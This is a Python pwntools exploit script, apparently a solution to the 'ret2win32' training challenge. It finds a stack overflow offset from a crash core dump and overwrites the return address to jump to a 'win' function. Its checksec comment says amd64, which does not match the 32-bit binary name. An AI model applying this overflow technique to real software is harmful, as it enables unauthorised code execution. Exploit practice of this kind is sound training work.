#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ret2win
from pwn import *
import os
from glob import glob

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ret2win32')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

def offset():
    io = start()
    io.sendlineafter(b"> ", cyclic(0x1000))
    io.wait()

    core = io.corefile

    io.close()
    for file in glob("./core.*"):
        os.remove(file)
    return cyclic_find(core.fault_addr)

io = start()

ret2win = exe.symbols["ret2win"]

rop = ROP(exe)
rop.raw(b"\x90"*offset())
rop.raw(ret2win)

io.sendlineafter(b"> ", rop.chain())

io.interactive()

